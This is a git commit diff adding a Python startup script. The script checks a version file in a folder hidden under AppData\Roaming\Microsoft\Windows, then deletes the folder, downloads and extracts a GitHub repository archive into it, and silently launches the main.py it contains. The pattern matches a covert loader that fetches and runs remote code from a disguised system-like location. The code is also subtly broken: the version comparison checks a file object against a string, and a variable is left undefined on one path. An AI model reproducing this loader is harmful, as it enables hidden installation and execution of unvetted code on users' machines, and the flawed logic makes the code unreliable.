8d738a2c71d5ea1d6356ebc391e62c3d416b19ef
noel-create <ladi.noel20@gmail.com>
2025-01-22 21:31:08 +0100

    Update startup.py

---
+++ startup.py
@@ -0,0 +1,26 @@
+import time
+import requests
+import zipfile
+import os
+import sys
+import shutil
+import subprocess
+
+user_profile = os.environ['USERPROFILE']
+with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibid-mainmain', 'ver.txt')) as ver:
+    r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver")
+    ver1 = r.text
+    if ver == ver1:
+        pass
+    else:
+        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibid-mainmain'))
+        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
+        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
+        open(file_path, 'wb').write(r.content)
+        with zipfile.ZipFile(file_path, 'r') as zip_ref:
+            zip_ref.extractall(target_path)
+        os.remove(file_path)
+
+subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])
+
